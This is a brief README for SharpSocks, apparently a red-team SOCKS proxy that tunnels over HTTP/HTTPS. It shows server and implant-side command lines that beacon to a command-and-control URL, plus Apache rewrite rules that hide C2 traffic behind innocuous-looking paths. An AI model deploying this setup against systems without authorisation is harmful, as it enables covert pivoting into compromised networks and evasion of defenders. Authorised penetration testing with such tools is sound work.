# SharpSocks 2017 Nettitude
Tunnellable HTTP/HTTPS socks4a proxy written in C# and deployable via PowerShell

Written by Rob Maslen @rbmaslen

# Usage Server 
SharpSocks -Server -IPAddress 192.168.1.10 -Uri https://www.c2url.com:443 -SocksPort 43334 

# Usage Client (Implant side)
SharpSocks -Client -Uri https://www.c2url.com:443 -Key PTDWISSNRCThqmpWEzXFZ1nSusz10u0qZ0n0UjH66rs= -Channel 7f404221-9f30-470b-b05d-e1a922be3ff6 -URLs "site/review/access","upload/data/images" -Beacon 2000

# Apache ReWrite Rule (c2 proxy)
Define SharpSocks 10.0.0.1
RewriteRule ^/site/review/access(.*) https://${SharpSocks}:443/site/review/access$1 [NC,P]
RewriteRule ^/upload/data/images(.*) https://${SharpSocks}:443/upload/data/images$1 [NC,P]

# License
FreeBSD 3
